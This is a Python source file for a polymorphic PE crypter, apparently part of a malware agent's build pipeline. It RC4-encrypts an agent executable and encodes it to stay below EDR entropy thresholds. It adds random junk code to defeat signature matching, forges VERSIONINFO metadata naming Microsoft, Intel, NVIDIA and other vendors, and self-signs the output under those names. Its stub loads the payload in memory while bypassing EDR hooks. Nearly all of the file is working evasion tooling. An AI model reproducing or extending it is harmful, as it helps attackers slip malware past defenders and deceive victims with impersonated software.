#!/usr/bin/env python3
"""
pe_crypt.py — Polymorphic PE crypter.

Takes a compiled agent .exe, encrypts it with RC4 (derived key from seed),
and generates a stub loader that decrypts + reflectively loads the agent
in memory.

The stub links kernel32 for a legitimate IAT (benign API calls in the
entry point create real import entries) while all critical memory ops
(NtAllocateVirtualMemory, NtProtectVirtualMemory) go through ntdll
resolved via PEB walk — no hooks for EDR to intercept.

Each invocation produces a unique binary: different seed, different key,
different ciphertext, randomised VERSIONINFO metadata, self-signed
Authenticode signature, and varied junk code — no static signature
match across builds.

Usage:
    python pe_crypt.py --input builds/agent_payload.exe --output builds/agent.exe

Called automatically by build_agent_c.py during the two-pass build.
"""

import argparse
import datetime
import hashlib
import math
import os
import random
import secrets
import shutil
import string
import struct
import subprocess
import sys
import tempfile
from pathlib import Path


def shannon_entropy(data: bytes) -> float:
    """
    Calculate Shannon entropy of a byte sequence (0.0 – 8.0 bits/byte).

    0.0 = all identical bytes, 8.0 = perfectly uniform distribution.
    EDR heuristics typically flag PE sections with entropy > 6.5–7.0.
    """
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    length = len(data)
    entropy = 0.0
    for count in freq:
        if count > 0:
            p = count / length
            entropy -= p * math.log2(p)
    return entropy


def _derive_key(seed: bytes, key_len: int = 256) -> bytes:
    """
    Derive an RC4 key from a seed using XOR-rotate-multiply expansion.
    MUST match the C implementation in stub_loader.c exactly.
    """
    key = bytearray(key_len)
    for i in range(0, key_len, 4):
        h = 0x4E67C6A7
        block = i >> 2
        for j in range(len(seed)):
            val = seed[j] + block
            h = (h ^ val) & 0xFFFFFFFF
            h = ((h << 7) | (h >> 25)) & 0xFFFFFFFF  # ROL 7
            h = (h + val * 0xAB) & 0xFFFFFFFF
        key[i] = h & 0xFF
        if i + 1 < key_len: key[i + 1] = (h >> 8) & 0xFF
        if i + 2 < key_len: key[i + 2] = (h >> 16) & 0xFF
        if i + 3 < key_len: key[i + 3] = (h >> 24) & 0xFF
    return bytes(key)


def rc4_crypt(data: bytes, key: bytes) -> bytes:
    """RC4 encrypt/decrypt (symmetric). Key derived from seed."""
    # KSA
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]

    # PRGA
    out = bytearray(len(data))
    ii = jj = 0
    for k in range(len(data)):
        ii = (ii + 1) & 0xFF
        jj = (jj + S[ii]) & 0xFF
        S[ii], S[jj] = S[jj], S[ii]
        out[k] = data[k] ^ S[(S[ii] + S[jj]) & 0xFF]
    return bytes(out)


def nibble_encode(data: bytes) -> bytes:
    """
    Encode each byte as two bytes from a 16-char alphabet ('A'-'P').

    Each input byte B is split into high nibble and low nibble:
        encoded[i*2]   = 0x41 + (B >> 4)     # 'A' + high nibble (0-15)
        encoded[i*2+1] = 0x41 + (B & 0x0F)   # 'A' + low nibble  (0-15)

    Output uses only bytes 0x41-0x50 (16 distinct values).
    Shannon entropy ≈ 4.0 bits/byte — well below EDR thresholds (~6.5-7.0).
    Trade-off: 2x size increase.
    """
    out = bytearray(len(data) * 2)
    for i, b in enumerate(data):
        out[i * 2]     = 0x41 + (b >> 4)
        out[i * 2 + 1] = 0x41 + (b & 0x0F)
    return bytes(out)


def generate_stub_payload_h(encoded: bytes, seed: bytes, decoded_size: int) -> str:
    """Generate C header with nibble-encoded payload and seed (not the key)."""

    def format_bytes(data: bytes, var_name: str, per_line: int = 16) -> str:
        lines = []
        lines.append(f"static unsigned char {var_name}[] = {{")
        for i in range(0, len(data), per_line):
            chunk = data[i:i + per_line]
            hex_vals = ", ".join(f"0x{b:02X}" for b in chunk)
            comma = "," if i + per_line < len(data) else ""
            lines.append(f"    {hex_vals}{comma}")
        lines.append("};")
        return "\n".join(lines)

    # Use innocuous variable names — looks like embedded resources
    payload_arr = format_bytes(encoded, "g_res_data")
    seed_arr = format_bytes(seed, "g_res_cfg")

    return f"""/*
 * stub_payload.h — Auto-generated resource data.
 * DO NOT EDIT — regenerated on every build.
 */
#ifndef STUB_PAYLOAD_H
#define STUB_PAYLOAD_H

{payload_arr}

{seed_arr}

#define RES_DATA_SIZE    {len(encoded)}u
#define RES_DECODED_SIZE {decoded_size}u
#define RES_CFG_SIZE     {len(seed)}u

#endif /* STUB_PAYLOAD_H */
"""


def generate_junk_functions() -> str:
    """Generate random junk C functions to vary the stub binary.

    Produces a mix of patterns: arithmetic chains, simple string buffers,
    loops with accumulators, and conditional branches — enough variety
    that each build's .text section looks structurally different.
    """
    rng = random.SystemRandom()
    funcs = []
    num_funcs = rng.randint(4, 9)

    for i in range(num_funcs):
        name = "".join(rng.choices(string.ascii_lowercase, k=rng.randint(6, 14)))
        pattern = rng.choice(["arith", "loop", "branch", "buffer"])

        if pattern == "arith":
            # Classic arithmetic chain
            ret_type = rng.choice(["int", "unsigned int", "unsigned long"])
            body = [f"    {ret_type} x = {rng.randint(1, 0xFFFF)};"]
            for _ in range(rng.randint(5, 12)):
                op = rng.choice(["+", "^", "*", "-", "<<", ">>", "|", "&"])
                val = rng.randint(1, 255) if op not in ("<<", ">>") else rng.randint(1, 15)
                body.append(f"    x = x {op} {val};")
            body.append("    return x;")
            funcs.append(
                f"static __attribute__((used)) {ret_type} {name}(void) {{\n"
                + "\n".join(body) + "\n}\n"
            )

        elif pattern == "loop":
            # Loop with accumulator
            iters = rng.randint(4, 20)
            body = [
                f"    unsigned int acc = 0x{rng.randint(1, 0xFFFF):04X};",
                f"    for (int i = 0; i < {iters}; i++) {{",
            ]
            op = rng.choice(["^", "+", "*"])
            body.append(f"        acc = acc {op} (i + {rng.randint(1, 127)});")
            if rng.random() > 0.5:
                body.append(f"        acc = (acc << {rng.randint(1, 7)}) | (acc >> {32 - rng.randint(1, 7)});")
            body += ["    }", "    return acc;"]
            funcs.append(
                f"static __attribute__((used)) unsigned int {name}(void) {{\n"
                + "\n".join(body) + "\n}\n"
            )

        elif pattern == "branch":
            # Conditional branches
            ret_type = "unsigned long"
            init_val = rng.randint(0, 0xFFFF)
            body = [f"    {ret_type} v = {init_val};"]
            for _ in range(rng.randint(2, 5)):
                threshold = rng.randint(1, 0xFFFF)
                op_a = rng.choice(["^", "+", "*"])
                op_b = rng.choice(["^", "-", "+"])
                val_a = rng.randint(1, 0xFF)
                val_b = rng.randint(1, 0xFF)
                body += [
                    f"    if (v > {threshold})",
                    f"        v = v {op_a} {val_a};",
                    f"    else",
                    f"        v = v {op_b} {val_b};",
                ]
            body.append("    return v;")
            funcs.append(
                f"static __attribute__((used)) {ret_type} {name}(void) {{\n"
                + "\n".join(body) + "\n}\n"
            )

        else:  # buffer
            # Stack buffer manipulation — looks like string processing
            buf_sz = rng.randint(8, 32)
            body = [f"    char buf[{buf_sz}];"]
            for j in range(min(buf_sz, rng.randint(4, buf_sz))):
                body.append(f"    buf[{j}] = {rng.randint(0x20, 0x7E)};")
            body += [
                f"    unsigned int h = 0;",
                f"    for (int i = 0; i < {min(buf_sz, rng.randint(4, buf_sz))}; i++)",
                f"        h = h * 31 + buf[i];",
                f"    return h;",
            ]
            funcs.append(
                f"static __attribute__((used)) unsigned int {name}(void) {{\n"
                + "\n".join(body) + "\n}\n"
            )

    return "\n".join(funcs)


# ── VERSIONINFO resource generation ──────────────────────────────────────

# Pools of plausible values for randomised PE metadata.
# Each build picks a random combination → unique VERSIONINFO per binary.
_COMPANY_POOL = [
    "Microsoft Corporation", "Intel Corporation", "NVIDIA Corporation",
    "Realtek Semiconductor Corp.", "Logitech Inc.", "Dell Technologies",
    "Hewlett-Packard Company", "Lenovo Group Limited", "ASUS Computer Inc.",
    "Broadcom Corporation", "Synaptics Incorporated", "Texas Instruments",
    "Qualcomm Technologies Inc.", "Advanced Micro Devices Inc.",
]

_PRODUCT_POOL = [
    "System Configuration Utility", "Hardware Monitor Service",
    "Display Adapter Helper", "Audio Control Panel",
    "Network Configuration Manager", "Power Management Service",
    "Storage Optimization Tool", "Device Firmware Update",
    "Performance Data Collector", "Telemetry Client Helper",
    "Peripheral Configuration Tool", "Driver Update Assistant",
    "Security Health Service", "Diagnostic Data Runtime",
]

_DESCRIPTION_POOL = [
    "Manages system hardware configuration",
    "Provides device monitoring and telemetry",
    "Handles display adapter configuration changes",
    "Coordinates audio device settings",
    "Manages network adapter properties",
    "Monitors power state transitions",
    "Optimizes storage device performance",
    "Firmware update coordination service",
    "Collects system performance metrics",
    "Processes diagnostic telemetry data",
    "Configures attached peripheral devices",
    "Coordinates driver update operations",
]

_INTERNAL_NAMES = [
    "svcutil", "devmon", "dxhelper", "audcfg", "netcfg",
    "pwrmgr", "stgopt", "fwupd", "perfcol", "telrun",
    "pericfg", "drvupd", "hlthsvc", "diagrt",
]


def generate_versioninfo_rc() -> str:
    """Generate a randomised VERSIONINFO .rc file.

    Picks plausible company/product/description combinations and random
    version numbers. The resulting resource makes the PE look like a
    legitimate vendor utility.
    """
    rng = random.SystemRandom()

    company = rng.choice(_COMPANY_POOL)
    product = rng.choice(_PRODUCT_POOL)
    description = rng.choice(_DESCRIPTION_POOL)
    internal = rng.choice(_INTERNAL_NAMES)

    major = rng.randint(1, 10)
    minor = rng.randint(0, 9)
    build = rng.randint(100, 9999)
    patch = rng.randint(0, 99)
    ver_str = f"{major}.{minor}.{build}.{patch}"
    ver_csv = f"{major},{minor},{build},{patch}"

    copyright_year = rng.randint(2019, 2025)

    return f"""#include <winver.h>

VS_VERSION_INFO VERSIONINFO
    FILEVERSION    {ver_csv}
    PRODUCTVERSION {ver_csv}
    FILEFLAGSMASK  VS_FFI_FILEFLAGSMASK
    FILEFLAGS      0x0
    FILEOS         VOS_NT_WINDOWS32
    FILETYPE       VFT_APP
    FILESUBTYPE    VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName",      "{company}"
            VALUE "FileDescription",  "{description}"
            VALUE "FileVersion",      "{ver_str}"
            VALUE "InternalName",     "{internal}"
            VALUE "LegalCopyright",   "Copyright (C) {copyright_year} {company}"
            VALUE "OriginalFilename", "{internal}.exe"
            VALUE "ProductName",      "{product}"
            VALUE "ProductVersion",   "{ver_str}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 0x04B0
    END
END
"""


# ── DER encoding helpers (for Authenticode PKCS#7 construction) ─────────

def _der_len(length: int) -> bytes:
    """Encode a DER definite length."""
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    elif length < 0x10000:
        return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
    else:
        return bytes([0x83, (length >> 16) & 0xFF,
                      (length >> 8) & 0xFF, length & 0xFF])


def _der_tlv(tag: int, value: bytes) -> bytes:
    """Build a DER Tag-Length-Value triple."""
    return bytes([tag]) + _der_len(len(value)) + value


def _der_seq(*parts: bytes) -> bytes:
    return _der_tlv(0x30, b''.join(parts))


def _der_set(*parts: bytes) -> bytes:
    return _der_tlv(0x31, b''.join(parts))


def _der_oid(dotted: str) -> bytes:
    """Encode an OBJECT IDENTIFIER from dotted notation."""
    components = [int(x) for x in dotted.split('.')]

    def _base128(v):
        if v < 128:
            return bytes([v])
        out = []
        out.append(v & 0x7F)
        v >>= 7
        while v:
            out.append((v & 0x7F) | 0x80)
            v >>= 7
        out.reverse()
        return bytes(out)

    body = _base128(40 * components[0] + components[1])
    for c in components[2:]:
        body += _base128(c)
    return _der_tlv(0x06, body)


def _der_int(value: int) -> bytes:
    """Encode a non-negative INTEGER."""
    if value == 0:
        return _der_tlv(0x02, b'\x00')
    h = format(value, 'x')
    if len(h) % 2:
        h = '0' + h
    b = bytes.fromhex(h)
    if b[0] & 0x80:
        b = b'\x00' + b
    return _der_tlv(0x02, b)


def _der_oct(data: bytes) -> bytes:
    return _der_tlv(0x04, data)


def _der_bitstr(data: bytes, unused: int = 0) -> bytes:
    return _der_tlv(0x03, bytes([unused]) + data)


def _der_null() -> bytes:
    return b'\x05\x00'


def _der_utctime(dt: datetime.datetime) -> bytes:
    return _der_tlv(0x17, dt.strftime('%y%m%d%H%M%SZ').encode('ascii'))


# Authenticode OIDs
_OID_SIGNED_DATA   = '1.2.840.113549.1.7.2'
_OID_SPC_INDIRECT  = '1.3.6.1.4.1.311.2.1.4'
_OID_SPC_PE_IMAGE  = '1.3.6.1.4.1.311.2.1.15'
_OID_SHA256         = '2.16.840.1.101.3.4.2.1'
_OID_RSA            = '1.2.840.113549.1.1.1'
_OID_SPC_OPUS_INFO  = '1.3.6.1.4.1.311.2.1.12'
_OID_CONTENT_TYPE   = '1.2.840.113549.1.9.3'
_OID_SIGNING_TIME   = '1.2.840.113549.1.9.5'
_OID_MESSAGE_DIGEST = '1.2.840.113549.1.9.4'


def _sha256_alg_id() -> bytes:
    """AlgorithmIdentifier for SHA-256."""
    return _der_seq(_der_oid(_OID_SHA256), _der_null())


def _build_spc_indirect_data(pe_hash: bytes) -> bytes:
    """Build the SpcIndirectDataContent SEQUENCE."""
    spc_pe_image = _der_seq(
        _der_bitstr(b'', 0),
        _der_tlv(0xA0,                                 # [0] EXPLICIT
            _der_tlv(0xA2,                              # [2] EXPLICIT file
                _der_tlv(0x80, b'')                     # [0] IMPLICIT BMPString ""
            )
        )
    )
    spc_attr = _der_seq(_der_oid(_OID_SPC_PE_IMAGE), spc_pe_image)
    digest_info = _der_seq(_sha256_alg_id(), _der_oct(pe_hash))
    return _der_seq(spc_attr, digest_info)


def _build_auth_attrs_body(content_digest: bytes,
                           signing_time: datetime.datetime,
                           description: str = "") -> bytes:
    """Build authenticated attributes (sorted SET OF Attribute).

    Returns raw concatenated DER of the four attributes.
    Caller wraps in [0] IMPLICIT (0xA0) for PKCS#7 or SET (0x31)
    for signing.

    The SPC_SP_OPUS_INFO attribute carries the program description
    that Windows shows as the signer subject in Properties →
    Digital Signatures.
    """
    attr_ct = _der_seq(
        _der_oid(_OID_CONTENT_TYPE),
        _der_set(_der_oid(_OID_SPC_INDIRECT)),
    )
    attr_st = _der_seq(
        _der_oid(_OID_SIGNING_TIME),
        _der_set(_der_utctime(signing_time)),
    )
    attr_md = _der_seq(
        _der_oid(_OID_MESSAGE_DIGEST),
        _der_set(_der_oct(content_digest)),
    )

    # SPC_SP_OPUS_INFO — populates signer name in Windows properties
    if description:
        opus_body = _der_seq(
            _der_tlv(0xA0,                          # programName [0] EXPLICIT
                _der_tlv(0x80,                      # BMPString [0] IMPLICIT
                    description.encode('utf-16-be'))
            )
        )
    else:
        opus_body = _der_seq()
    attr_opus = _der_seq(
        _der_oid(_OID_SPC_OPUS_INFO),
        _der_set(opus_body),
    )

    # DER SET OF: elements sorted by their encoded value
    return b''.join(sorted([attr_ct, attr_st, attr_md, attr_opus]))


def _pe_checksum(data: bytearray) -> int:
    """Compute PE checksum (same algorithm as Windows imagehlp)."""
    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    csum_off = e_lfanew + 4 + 20 + 64
    csum = 0
    top = 1 << 32
    for i in range(0, len(data) & ~1, 2):
        if i == csum_off or i == csum_off + 2:
            continue
        csum += data[i] | (data[i + 1] << 8)
        if csum >= top:
            csum = (csum & 0xFFFF) + (csum >> 16)
    if len(data) % 2:
        csum += data[-1]
        if csum >= top:
            csum = (csum & 0xFFFF) + (csum >> 16)
    csum = (csum & 0xFFFF) + (csum >> 16)
    csum = (csum & 0xFFFF) + (csum >> 16)
    csum += len(data)
    return csum & 0xFFFFFFFF


# ── Self-signed Authenticode signing (pure Python) ──────────────────────

def _sign_pe_python(exe_path, company: str, description: str = "") -> bool:
    """Self-signed Authenticode signing — pure Python, no external tools.

    Uses the ``cryptography`` library for RSA key generation, X.509
    certificate creation, and PKCS#1 v1.5 signing.  The Authenticode-
    specific PKCS#7 / SpcIndirectDataContent / WIN_CERTIFICATE embedding
    is hand-rolled DER — zero CLI dependencies (no openssl, no
    osslsigncode).

    Returns True on success, False on failure (best-effort — the
    unsigned binary is still functional).
    """
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import (
            rsa, padding as asym_padding)
        from cryptography.x509.oid import NameOID
    except ImportError:
        print("[!] cryptography library not installed — signing skipped")
        return False

    rng = random.SystemRandom()
    exe_path = Path(exe_path)
    pe_data = bytearray(exe_path.read_bytes())

    # ── Validate PE ──
    if pe_data[:2] != b'MZ':
        print("[!] Not a valid PE — signing skipped")
        return False
    e_lfanew = struct.unpack_from('<I', pe_data, 0x3C)[0]
    if pe_data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
        print("[!] Invalid PE signature — signing skipped")
        return False

    opt_offset = e_lfanew + 4 + 20
    magic = struct.unpack_from('<H', pe_data, opt_offset)[0]
    checksum_offset = opt_offset + 64
    if magic == 0x20b:
        cert_dd_offset = opt_offset + 144
    elif magic == 0x10b:
        cert_dd_offset = opt_offset + 128
    else:
        print(f"[!] Unknown PE magic 0x{magic:04x} — signing skipped")
        return False

    # ── Generate RSA key + self-signed cert ──
    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048)

    _OU = ["Software Engineering", "Product Development",
           "Driver Development", "Platform Engineering",
           "Systems Software", "Core Services",
           "Client Software", "Release Engineering"]
    _LOC = ["Santa Clara", "Redmond", "Austin", "San Jose",
            "Round Rock", "Palo Alto", "Irvine", "Hillsboro"]
    _ST = ["California", "Washington", "Texas", "Oregon"]

    now = datetime.datetime.utcnow()
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, rng.choice(_ST)),
        x509.NameAttribute(NameOID.LOCALITY_NAME, rng.choice(_LOC)),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, company),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, rng.choice(_OU)),
        x509.NameAttribute(NameOID.COMMON_NAME, company),
    ])

    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(private_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=rng.randint(0, 365)))
        .not_valid_after(now + datetime.timedelta(days=rng.randint(365, 1095)))
        .add_extension(
            x509.ExtendedKeyUsage(
                [x509.oid.ExtendedKeyUsageOID.CODE_SIGNING]),
            critical=False)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True, content_commitment=False,
                key_encipherment=False, data_encipherment=False,
                key_agreement=False, key_cert_sign=False,
                crl_sign=False, encipher_only=False,
                decipher_only=False),
            critical=True)
        .sign(private_key, hashes.SHA256())
    )

    cert_der = cert.public_bytes(serialization.Encoding.DER)
    issuer_der = cert.issuer.public_bytes()
    serial_number = cert.serial_number

    # ── Compute Authenticode PE hash ──
    pe_data[checksum_offset:checksum_offset + 4] = b'\x00' * 4
    pe_data[cert_dd_offset:cert_dd_offset + 8] = b'\x00' * 8

    pe_hash = hashlib.sha256()
    pe_hash.update(pe_data[:checksum_offset])
    pe_hash.update(pe_data[checksum_offset + 4:cert_dd_offset])
    pe_hash.update(pe_data[cert_dd_offset + 8:])
    pe_hash = pe_hash.digest()

    # ── Build PKCS#7 SignedData ──
    spc_content = _build_spc_indirect_data(pe_hash)

    content_digest = hashlib.sha256(spc_content).digest()
    attrs_body = _build_auth_attrs_body(content_digest, now, description)

    # Sign authenticated attrs (re-tagged as SET 0x31 for signing)
    attrs_for_signing = _der_tlv(0x31, attrs_body)
    signature = private_key.sign(
        attrs_for_signing, asym_padding.PKCS1v15(), hashes.SHA256())

    signer_info = _der_seq(
        _der_int(1),
        _der_seq(issuer_der, _der_int(serial_number)),
        _sha256_alg_id(),
        _der_tlv(0xA0, attrs_body),               # authenticatedAttributes [0]
        _der_seq(_der_oid(_OID_RSA), _der_null()), # digestEncryptionAlgorithm
        _der_oct(signature),
    )

    signed_data = _der_seq(
        _der_int(1),
        _der_set(_sha256_alg_id()),
        _der_seq(_der_oid(_OID_SPC_INDIRECT),
                 _der_tlv(0xA0, spc_content)),     # [0] EXPLICIT content
        _der_tlv(0xA0, cert_der),                  # certificates [0] IMPLICIT
        _der_set(signer_info),
    )

    pkcs7 = _der_seq(
        _der_oid(_OID_SIGNED_DATA),
        _der_tlv(0xA0, signed_data),               # [0] EXPLICIT
    )

    # ── Embed WIN_CERTIFICATE in PE ──
    win_cert = struct.pack('<IHH', 8 + len(pkcs7), 0x0200, 0x0002) + pkcs7
    win_cert += b'\x00' * ((8 - len(win_cert) % 8) % 8)  # 8-byte align

    # Pad PE to 8-byte boundary before cert table
    pe_data += b'\x00' * ((8 - len(pe_data) % 8) % 8)
    cert_table_rva = len(pe_data)
    struct.pack_into('<II', pe_data, cert_dd_offset,
                     cert_table_rva, len(win_cert))
    pe_data += win_cert

    # Recompute PE checksum
    struct.pack_into('<I', pe_data, checksum_offset, _pe_checksum(pe_data))

    exe_path.write_bytes(pe_data)
    print(f"[+] Authenticode signature applied (self-signed, SHA-256)")
    return True


def build_stub(
    stub_src: Path,
    payload_header: Path,
    output_exe: Path,
    arch: str = "x64",
    junk_code: str = "",
    debug: bool = False,
    sign: bool = True,
) -> Path:
    """Compile the stub loader with the encrypted payload.

    The stub is compiled with -nostdlib (no CRT startup) but LINKS
    kernel32 so that the benign API calls in the entry point generate
    real IAT entries.  Critical memory ops use Nt* functions resolved
    from ntdll via PEB walk — no EDR-hooked kernel32 VirtualAlloc in
    the hot path.

    A randomised VERSIONINFO resource is compiled with windres and
    linked into every build, giving the PE the metadata profile of a
    legitimate vendor utility.
    """

    cc = "x86_64-w64-mingw32-gcc" if arch == "x64" else "i686-w64-mingw32-gcc"
    windres = "x86_64-w64-mingw32-windres" if arch == "x64" else "i686-w64-mingw32-windres"
    strip_cmd = "x86_64-w64-mingw32-strip" if arch == "x64" else "i686-w64-mingw32-strip"

    if not shutil.which(cc):
        raise FileNotFoundError(f"{cc} not found. Install mingw-w64.")

    build_dir = payload_header.parent

    # ── Generate and compile VERSIONINFO resource ──
    rc_path = build_dir / "version.rc"
    rc_obj_path = build_dir / "version.o"
    vi_content = generate_versioninfo_rc()
    rc_path.write_text(vi_content)

    # Extract company name from the .rc for consistent cert CN
    _vi_company = ""
    for line in vi_content.splitlines():
        if '"CompanyName"' in line:
            _vi_company = line.split('"')[-2]
            break

    if shutil.which(windres):
        rc_result = subprocess.run(
            [windres, str(rc_path), "-o", str(rc_obj_path)],
            capture_output=True, text=True
        )
        if rc_result.returncode != 0:
            print(f"[!] windres warning (VERSIONINFO skipped): {rc_result.stderr}")
            rc_obj_path = None
    else:
        print("[!] windres not found — VERSIONINFO resource skipped")
        rc_obj_path = None

    # Write junk code to a separate file if any
    junk_path = build_dir / "stub_junk.h"
    junk_path.write_text(
        f"/* Auto-generated junk code for polymorphism */\n{junk_code}\n"
    )

    cmd = [
        cc,
        f"-I{build_dir}",
        "-Wall", "-Os", "-s",
        "-fno-asynchronous-unwind-tables",
        "-fno-ident",
        "-fdata-sections",
        "-ffunction-sections",
        "-fno-stack-protector",       # No stack canary (__security_cookie)
        "-fno-builtin",               # No implicit memcpy/memset calls
        "-DWIN32_LEAN_AND_MEAN",
        *((["-DSTUB_DEBUG"] if debug else [])),
        "-include", str(junk_path),
        "-o", str(output_exe),
        str(stub_src),
    ]

    # Link the VERSIONINFO .o if we compiled it
    if rc_obj_path and rc_obj_path.exists():
        cmd.append(str(rc_obj_path))

    cmd += [
        # ── No CRT, but kernel32 for legitimate IAT ──
        "-nostdlib",                   # No libc, no CRT startup
        "-Wl,-e,_stub_entry",         # Direct entry point (no WinMainCRTStartup)
        "-Wl,--subsystem,windows",
        "-Wl,--gc-sections",
        "-lkernel32",                  # Legitimate IAT from entry-point API calls
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        raise RuntimeError(f"Stub compilation failed:\n{result.stderr}")

    # Strip symbols
    if shutil.which(strip_cmd):
        subprocess.run([strip_cmd, "--strip-all", str(output_exe)], capture_output=True)

    # ── Self-signed Authenticode signature (pure Python) ──
    if sign and _vi_company:
        _vi_desc = ""
        for line in vi_content.splitlines():
            if '"FileDescription"' in line:
                _vi_desc = line.split('"')[-2]
                break
        _sign_pe_python(output_exe, _vi_company, description=_vi_desc)

    return output_exe


NUM_CANDIDATES = 4


def _generate_candidate(pe_bytes: bytes) -> tuple:
    """
    Generate one encryption candidate in memory.
    Returns (seed, encoded_payload, entropy).
    """
    seed = secrets.token_bytes(64)
    rc4_key = _derive_key(seed, 256)
    encrypted = rc4_crypt(pe_bytes, rc4_key)

    # Verify round-trip
    assert rc4_crypt(encrypted, rc4_key) == pe_bytes, "RC4 round-trip failed!"

    encoded = nibble_encode(encrypted)
    ent = shannon_entropy(encoded)
    return seed, encoded, ent


def crypt_pe(
    input_pe: Path,
    output_exe: Path,
    stub_dir: Path,
    arch: str = "x64",
    key_size: int = 32,
    debug: bool = False,
    candidates: int = NUM_CANDIDATES,
    sign: bool = True,
) -> Path:
    """
    Full crypter pipeline:
    1. Read input PE
    2. Generate N candidates (different seeds → different ciphertexts)
    3. Nibble-encode each, measure Shannon entropy
    4. Pick the lowest entropy candidate
    5. Compile only the winner into the final stub
    """
    pe_bytes = input_pe.read_bytes()
    pe_size = len(pe_bytes)

    # Generate N candidates in memory, pick lowest entropy
    print(f"[*] Generating {candidates} candidates, measuring entropy...")
    best_seed = None
    best_encoded = None
    best_entropy = 9.0  # impossibly high

    for i in range(candidates):
        seed, encoded, ent = _generate_candidate(pe_bytes)
        tag = "  ←  best" if ent < best_entropy else ""
        print(f"    candidate {i+1}: entropy={ent:.4f}  seed={seed[:8].hex()}...{tag}")
        if ent < best_entropy:
            best_entropy = ent
            best_seed = seed
            best_encoded = encoded

    print(f"[*] Winner: entropy={best_entropy:.4f}  seed={best_seed[:8].hex()}...")

    # Create temp build directory
    build_dir = Path(tempfile.mkdtemp(prefix="stub_build_"))

    try:
        # Generate payload header with the winning candidate
        header_content = generate_stub_payload_h(best_encoded, best_seed, pe_size)
        header_path = build_dir / "stub_payload.h"
        header_path.write_text(header_content)

        # Generate junk code for polymorphism
        junk = generate_junk_functions()

        # Copy stub source
        stub_src = stub_dir / "stub_loader.c"
        if not stub_src.exists():
            raise FileNotFoundError(f"Stub source not found: {stub_src}")

        # Compile only the winner
        build_stub(stub_src, header_path, output_exe, arch, junk,
                   debug=debug, sign=sign)

        final_entropy = shannon_entropy(output_exe.read_bytes())
        print(f"[+] Crypter: {pe_size} bytes → "
              f"{len(best_encoded)} bytes encoded (payload entropy={best_entropy:.4f}) → "
              f"{output_exe.stat().st_size} bytes stub (file entropy={final_entropy:.4f}) "
              f"(RC4+nibble, seed: {best_seed[:8].hex()}...)")

        return output_exe

    finally:
        shutil.rmtree(build_dir, ignore_errors=True)


def main():
    parser = argparse.ArgumentParser(description="Polymorphic PE crypter")
    parser.add_argument("--input", type=Path, required=True,
                        help="Input PE file to encrypt")
    parser.add_argument("--output", type=Path, required=True,
                        help="Output encrypted stub exe")
    parser.add_argument("--stub-dir", type=Path, default=None,
                        help="Directory containing stub_loader.c")
    parser.add_argument("--arch", choices=["x64", "x86"], default="x64")
    parser.add_argument("--key-size", type=int, default=32,
                        help="Seed size in bytes (default: 32)")
    parser.add_argument("--candidates", type=int, default=NUM_CANDIDATES,
                        help=f"Number of encryption candidates to evaluate (default: {NUM_CANDIDATES})")
    parser.add_argument("--no-sign", action="store_true",
                        help="Skip self-signed Authenticode signing")
    args = parser.parse_args()

    if not args.input.exists():
        print(f"[!] Input file not found: {args.input}", file=sys.stderr)
        sys.exit(1)

    stub_dir = args.stub_dir
    if not stub_dir:
        # Default: look for agent_c/stub/ relative to this script
        stub_dir = Path(__file__).parent.parent / "agent_c" / "stub"

    args.output.parent.mkdir(parents=True, exist_ok=True)

    crypt_pe(args.input, args.output, stub_dir, args.arch, args.key_size,
             candidates=args.candidates, sign=not args.no_sign)


if __name__ == "__main__":
    main()
